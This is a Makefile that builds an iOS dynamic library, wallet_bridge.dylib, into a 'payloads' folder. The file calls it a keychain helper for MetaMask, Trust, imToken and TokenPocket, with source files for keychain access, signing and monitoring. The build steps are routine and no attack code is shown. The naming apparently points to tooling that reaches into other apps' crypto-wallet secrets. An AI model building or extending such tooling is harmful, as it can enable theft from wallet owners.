# wallet_bridge.dylib — MetaMask / Trust / imToken / TokenPocket keychain helper
#
# Build (requires Xcode iOS SDK):
#   cd bootstrap_wallet && ./build.sh
#
# Output:
#   ../payloads/wallet_bridge.dylib

SDK ?= $(shell xcrun --sdk iphoneos --show-sdk-path 2>/dev/null)
ARCH ?= arm64
MIN_IOS ?= 15.0
OUT = ../payloads/wallet_bridge.dylib

SRCS = wallet_keychain.m wallet_sign.m wallet_monitor.m wallet_bridge.m
OBJS = $(SRCS:.m=.o)

CFLAGS = -arch $(ARCH) -isysroot $(SDK) -miphoneos-version-min=$(MIN_IOS) -fobjc-arc -Os -Wall
LDFLAGS = -arch $(ARCH) -isysroot $(SDK) -miphoneos-version-min=$(MIN_IOS) \
          -dynamiclib \
          -framework Security -framework CoreFoundation -framework Foundation -framework UIKit \
          -install_name @rpath/wallet_bridge.dylib

.PHONY: all clean

all: $(OUT)

$(OUT): $(OBJS)
	@mkdir -p ../payloads
	clang $(LDFLAGS) -o $@ $(OBJS)
	@echo "Built $@"

%.o: %.m wallet_profiles.h
	clang $(CFLAGS) -c $< -o $@

clean:
	rm -f $(OBJS) $(OUT)
